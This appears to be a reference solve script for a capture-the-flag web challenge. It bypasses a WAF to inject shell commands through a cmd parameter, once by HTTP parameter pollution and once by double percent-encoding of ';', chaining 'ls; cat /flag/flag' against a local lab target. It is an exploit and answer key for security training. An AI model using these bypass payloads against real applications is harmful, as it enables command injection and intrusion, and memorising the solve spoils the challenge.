#!/usr/bin/env python3
"""Reference solve for inj14 (GateKeeper).

The WAF blocks ; | & $ ` and CR/LF in the cmd value it sees (first
occurrence, one percent-decode from the wire). The app percent-decodes its
value a second time and routes on the LAST occurrence. Two independent
doors:

  door 1 (double encoding):  /run?cmd=%253b+cat+/flag/flag
      wire %253b -> framework decode -> %3b (WAF: clean)
                         -> app decode   -> ;   (live)
  door 2 (HPP):              /run?cmd=ls&cmd=%3b+cat+/flag/flag
      WAF inspects the first value ("ls"); the app runs the last.

The solve uses door 2 (HPP) and falls back to door 1.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8053")
FLAG_RE = re.compile(r"flag\{[^}]+\}")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        # Sanity: the naive payload must be blocked by the WAF.
        r = requests.get(BASE + "/run", params={"cmd": "ls; cat /flag/flag"},
                         timeout=15)
        if r.status_code != 403:
            sys.stderr.write(f"warning: naive payload not blocked "
                             f"(HTTP {r.status_code})\n")
        # Sanity: a bare, unchained flag read must not work either -- no
        # metacharacters to trip the WAF, so this checks the app's own
        # diagnostic-command allowlist instead.
        r = requests.get(BASE + "/run", params={"cmd": "cat /flag/flag"},
                         timeout=15)
        if FLAG_RE.search(r.text):
            sys.stderr.write("warning: bare 'cat /flag/flag' worked with no "
                             "bypass at all -- challenge is not solving "
                             "anything\n")
        # Door 2: HTTP parameter pollution (last value wins at the app).
        # Note the leading "ls": a bare "; ..." is a shell syntax error --
        # the separator needs a command in front of it.
        r = requests.get(BASE + "/run",
                         params=[("cmd", "ls"), ("cmd", "ls%3b cat /flag/flag")],
                         timeout=15)
        m = FLAG_RE.search(r.text)
        if m:
            print(m.group(0))
            return 0
        # Door 1: double encoding. The value %3b ... goes on the wire as
        # %253b ... (requests percent-encodes it); the framework decodes to
        # %3b (WAF: clean), the app decodes again to ; (live).
        r = requests.get(BASE + "/run",
                         params={"cmd": "ls%3b cat /flag/flag"}, timeout=15)
        m = FLAG_RE.search(r.text)
        if m:
            print(m.group(0))
            return 0
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    sys.stderr.write(f"no flag found (HTTP {r.status_code}): {r.text[:200]}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
